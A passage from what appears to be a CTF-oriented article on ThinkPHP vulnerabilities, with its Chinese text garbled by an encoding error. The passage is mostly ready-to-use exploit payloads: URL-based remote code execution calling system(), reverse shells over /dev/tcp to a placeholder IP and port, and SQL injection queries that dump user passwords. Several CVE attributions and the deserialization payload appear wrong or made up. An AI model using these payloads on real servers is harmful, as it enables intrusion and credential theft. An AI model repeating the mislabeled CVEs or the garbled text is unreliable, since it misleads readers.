æˆ–è¾“å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li><strong>è·¯å¾„éå†</strong>ï¼šé€šè¿‡ä¸å½“çš„æ–‡ä»¶è·¯å¾„å¤„ç†è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€‚</li><li><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šåˆ©ç”¨ååºåˆ—åŒ–æœºåˆ¶å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</li></ol><p>æŒæ¡è¿™äº›æ”»å‡»æŠ€å·§å’Œé˜²å¾¡æªæ–½ï¼Œå¯ä»¥å¸®åŠ© CTF é€‰æ‰‹åœ¨æ¯”èµ›ä¸­å¿«é€Ÿè¯†åˆ«å¹¶åˆ©ç”¨ ThinkPHP æ¼æ´ã€‚</p><hr><h2 id="1-CVE-2018-20062-ThinkPHP-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#1-CVE-2018-20062-ThinkPHP-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="1. CVE-2018-20062 - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>1. <strong>CVE-2018-20062</strong> - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š"><a href="#èƒŒæ™¯ï¼š" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p><strong>CVE-2018-20062</strong> æ˜¯ ThinkPHP 5.x ç³»åˆ—ä¸­ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´åˆ©ç”¨äº†æ¡†æ¶ä¸­å¯¹ URL å‚æ•°çš„å¤„ç†ä¸å½“ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ URL è°ƒç”¨ PHP å†…ç½®å‡½æ•°ï¼Œæœ€ç»ˆå®ç°ä»£ç æ‰§è¡Œã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-1"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-1" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 5.0.23 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li><li>ThinkPHP 5.1.31 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li></ul><h3 id="æ¼æ´åŸç†ï¼š"><a href="#æ¼æ´åŸç†ï¼š" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h3><p>ThinkPHP åœ¨è·¯ç”±å¤„ç†æ—¶ï¼Œå…è®¸ URL ä¸­çš„å‡½æ•°å’Œå‚æ•°ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ URL æ¥è°ƒç”¨ä»»æ„å‡½æ•°å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨çš„-URL-æ ¼å¼ï¼š"><a href="#æ¼æ´åˆ©ç”¨çš„-URL-æ ¼å¼ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨çš„ URL æ ¼å¼ï¼š"></a>æ¼æ´åˆ©ç”¨çš„ URL æ ¼å¼ï¼š</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-params">[å‡½æ•°å]</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=å‚æ•°1&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=å‚æ•°2...</span><br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š"><a href="#åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š" class="headerlink" title="åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š"></a>åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š</h3><h4 id="æ‰§è¡Œ-phpinfo-å‡½æ•°ï¼š"><a href="#æ‰§è¡Œ-phpinfo-å‡½æ•°ï¼š" class="headerlink" title="æ‰§è¡Œ phpinfo() å‡½æ•°ï¼š"></a>æ‰§è¡Œ <code>phpinfo()</code> å‡½æ•°ï¼š</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ whoamiï¼š"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>whoami</code>ï¼š</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œ-id-å‘½ä»¤è·å–ç”¨æˆ·æƒé™ï¼š"><a href="#æ‰§è¡Œ-id-å‘½ä»¤è·å–ç”¨æˆ·æƒé™ï¼š" class="headerlink" title="æ‰§è¡Œ id å‘½ä»¤è·å–ç”¨æˆ·æƒé™ï¼š"></a>æ‰§è¡Œ <code>id</code> å‘½ä»¤è·å–ç”¨æˆ·æƒé™ï¼š</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œåå‘-Shell-å‘½ä»¤ï¼š"><a href="#æ‰§è¡Œåå‘-Shell-å‘½ä»¤ï¼š" class="headerlink" title="æ‰§è¡Œåå‘ Shell å‘½ä»¤ï¼š"></a>æ‰§è¡Œåå‘ Shell å‘½ä»¤ï¼š</h4><p>å¦‚æœæœåŠ¡å™¨å…è®¸å¤–éƒ¨ç½‘ç»œè®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ Payload è§¦å‘åå‘ Shellï¼š</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">bash</span>+-<span class="hljs-title">c</span>+&#x27;<span class="hljs-title">bash</span>+-<span class="hljs-title">i</span>+&gt;&amp;+/<span class="hljs-title">dev</span>/<span class="hljs-title">tcp</span>/<span class="hljs-params">[IP]</span>/<span class="hljs-params">[PORT]</span>+0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-CVE-2019-9082-ThinkPHP-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#2-CVE-2019-9082-ThinkPHP-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="2. CVE-2019-9082 - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>2. <strong>CVE-2019-9082</strong> - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š-1"><a href="#èƒŒæ™¯ï¼š-1" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p><strong>CVE-2019-9082</strong> æ˜¯ ThinkPHP 5.x ä¸­å¦ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ­¤æ¼æ´å‘ç”Ÿåœ¨å¤„ç† URL æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ URL é€šè¿‡æ¡†æ¶æ‰§è¡Œä»»æ„çš„ç³»ç»Ÿå‘½ä»¤ã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-2"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-2" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 5.0.23 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li><li>ThinkPHP 5.1.31 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li></ul><h3 id="æ¼æ´åŸç†ï¼š-1"><a href="#æ¼æ´åŸç†ï¼š-1" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h3><p>ç±»ä¼¼äº <strong>CVE-2018-20062</strong>ï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…åœ¨ URL ä¸­è°ƒç”¨ PHP å†…ç½®å‡½æ•°ï¼Œæœ€ç»ˆå®ç°ä»£ç æ‰§è¡Œã€‚</p><h3 id="åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-1"><a href="#åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-1" class="headerlink" title="åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š"></a>åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š</h3><h4 id="æ‰§è¡Œ-phpinfo-å‡½æ•°ï¼š-1"><a href="#æ‰§è¡Œ-phpinfo-å‡½æ•°ï¼š-1" class="headerlink" title="æ‰§è¡Œ phpinfo() å‡½æ•°ï¼š"></a>æ‰§è¡Œ <code>phpinfo()</code> å‡½æ•°ï¼š</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š-1"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š-1" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ whoamiï¼š"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>whoami</code>ï¼š</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ-ls-å‘½ä»¤ï¼‰ï¼š"><a href="#è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ-ls-å‘½ä»¤ï¼‰ï¼š" class="headerlink" title="è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ ls å‘½ä»¤ï¼‰ï¼š"></a>è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ <code>ls</code> å‘½ä»¤ï¼‰ï¼š</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bash<br>å¤åˆ¶ä»£ç <br><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œåå‘-Shellï¼š"><a href="#æ‰§è¡Œåå‘-Shellï¼š" class="headerlink" title="æ‰§è¡Œåå‘ Shellï¼š"></a>æ‰§è¡Œåå‘ Shellï¼š</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="3-CVE-2018-19518-ThinkPHP-ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#3-CVE-2018-19518-ThinkPHP-ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="3. CVE-2018-19518 - ThinkPHP ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>3. <strong>CVE-2018-19518</strong> - ThinkPHP ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š-2"><a href="#èƒŒæ™¯ï¼š-2" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p>è¯¥æ¼æ´æ˜¯ ThinkPHP 5.x ç³»åˆ—ä¸­çš„ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„ååºåˆ—åŒ–æ•°æ®ä¼ é€’æ¶æ„å¯¹è±¡ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-3"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-3" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 5.x ç³»åˆ—</li></ul><h3 id="æ¼æ´åŸç†ï¼š-2"><a href="#æ¼æ´åŸç†ï¼š-2" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h3><p>PHP ä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œå¦‚æœå¤„ç†ä¸å½“ï¼Œä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®è¿›è¡Œå¯¹è±¡æ³¨å…¥ã€‚ThinkPHP åœ¨æŸäº›åŠŸèƒ½ä¸­ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ“ä½œï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨æ¶æ„åºåˆ—åŒ–å¯¹è±¡å®ç°ä»£ç æ‰§è¡Œã€‚</p><h3 id="åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-2"><a href="#åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-2" class="headerlink" title="åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š"></a>åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š</h3><h4 id="æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼š"><a href="#æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼š" class="headerlink" title="æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼š"></a>æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼š</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åºåˆ—åŒ–å¯¹è±¡ä¸­çš„ <code>exec</code> å­—æ®µä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè°ƒç”¨ <code>phpinfo()</code> å‡½æ•°ã€‚</p><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š-2"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š-2" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ whoamiï¼š"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>whoami</code>ï¼š</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="4-CVE-2018-1000861-ThinkPHP-æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#4-CVE-2018-1000861-ThinkPHP-æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="4. CVE-2018-1000861 - ThinkPHP æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>4. <strong>CVE-2018-1000861</strong> - ThinkPHP æ¨¡æ¿æ³¨å…¥æ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š-3"><a href="#èƒŒæ™¯ï¼š-3" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p>æ¨¡æ¿æ³¨å…¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡ä¸å½“çš„è¾“å…¥æ’å…¥å¹¶æ‰§è¡Œä»»æ„çš„ PHP ä»£ç ã€‚æ­¤æ¼æ´å‘ç”Ÿåœ¨å¼€å‘è€…æœªæ­£ç¡®è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æƒ…å†µä¸‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ¨¡æ¿å¼•æ“æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-4"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-4" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 3.x å’Œ 5.x ç³»åˆ—</li></ul><h3 id="åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-3"><a href="#åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-3" class="headerlink" title="åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š"></a>åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š</h3><h4 id="é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œ-phpinfo-ï¼š"><a href="#é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œ-phpinfo-ï¼š" class="headerlink" title="é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œ phpinfo()ï¼š"></a>é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œ <code>phpinfo()</code>ï¼š</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š"><a href="#é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-whoamiï¼š" class="headerlink" title="é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ whoamiï¼š"></a>é€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>whoami</code>ï¼š</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ-ls-å‘½ä»¤ï¼‰ï¼š-1"><a href="#è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ-ls-å‘½ä»¤ï¼‰ï¼š-1" class="headerlink" title="è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ ls å‘½ä»¤ï¼‰ï¼š"></a>è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆæ‰§è¡Œ <code>ls</code> å‘½ä»¤ï¼‰ï¼š</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="5-CVE-2019-8018-ThinkPHP-SQL-æ³¨å…¥æ¼æ´"><a href="#5-CVE-2019-8018-ThinkPHP-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="5. CVE-2019-8018 - ThinkPHP SQL æ³¨å…¥æ¼æ´"></a>5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL æ³¨å…¥æ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š-4"><a href="#èƒŒæ™¯ï¼š-4" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p>æ­¤æ¼æ´å­˜åœ¨äº ThinkPHP ä¸­çš„ SQL æŸ¥è¯¢å¤„ç†éƒ¨åˆ†ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„çš„ SQL æŸ¥è¯¢æ“æ§æ•°æ®åº“ã€‚åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæœªæ­£ç¡®è¿‡æ»¤æˆ–ä½¿ç”¨ä¸å®‰å…¨çš„æŸ¥è¯¢æ–¹å¼ï¼Œå¯¼è‡´æ”»å‡»è€…é€šè¿‡æ‹¼æ¥ SQL è¯­å¥è¿›è¡Œæ³¨å…¥ã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-5"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-5" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 3.x ç³»åˆ—</li></ul><h3 id="åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-4"><a href="#åˆ©ç”¨-Payload-ç¤ºä¾‹ï¼š-4" class="headerlink" title="åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š"></a>åˆ©ç”¨ Payload ç¤ºä¾‹ï¼š</h3><h4 id="è·å–æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼š"><a href="#è·å–æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼š" class="headerlink" title="è·å–æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼š"></a>è·å–æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼š</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>--<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨-UNION-SELECT-è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼š"><a href="#åˆ©ç”¨-UNION-SELECT-è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼š" class="headerlink" title="åˆ©ç”¨ UNION SELECT è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼š"></a>åˆ©ç”¨ <code>UNION SELECT</code> è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼š</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">index.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-built_in">version</span>(), <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="æŸ¥è¯¢æ‰€æœ‰è¡¨åï¼š"><a href="#æŸ¥è¯¢æ‰€æœ‰è¡¨åï¼š" class="headerlink" title="æŸ¥è¯¢æ‰€æœ‰è¡¨åï¼š"></a>æŸ¥è¯¢æ‰€æœ‰è¡¨åï¼š</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT table_name <span class="hljs-keyword">FROM</span> information_schema.tables WHERE <span class="hljs-attribute">table_schema</span>=database() --<br></code></pre></td></tr></table></figure><h4 id="è·å–æŒ‡å®šè¡¨çš„å­—æ®µåï¼š"><a href="#è·å–æŒ‡å®šè¡¨çš„å­—æ®µåï¼š" class="headerlink" title="è·å–æŒ‡å®šè¡¨çš„å­—æ®µåï¼š"></a>è·å–æŒ‡å®šè¡¨çš„å­—æ®µåï¼š</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT column_name <span class="hljs-keyword">FROM</span> information_schema.columns WHERE <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --<br></code></pre></td></tr></table></figure><hr><h2 id="6-CVE-2019-7481-ThinkPHP-åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#6-CVE-2019-7481-ThinkPHP-åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="6. CVE-2019-7481 - ThinkPHP åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>6. <strong>CVE-2019-7481</strong> - ThinkPHP åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><h3 id="èƒŒæ™¯ï¼š-5"><a href="#èƒŒæ™¯ï¼š-5" class="headerlink" title="èƒŒæ™¯ï¼š"></a>èƒŒæ™¯ï¼š</h3><p>æ­¤æ¼æ´æ¶‰åŠåˆ° ThinkPHP æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„å¤„ç†ä¸å½“ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ¶æ„çš„ PHP æ–‡ä»¶ï¼Œç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼Œç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</p><h3 id="å—å½±å“ç‰ˆæœ¬ï¼š-6"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š-6" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h3><ul><li>ThinkPHP 5.x ç³»åˆ—</li></ul><h3 id="æ¼æ´åŸç†ï¼š-3"><a href="#æ¼æ´åŸç†ï¼š-3" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h3><p>æ–‡ä»¶ä¸Šä¼ 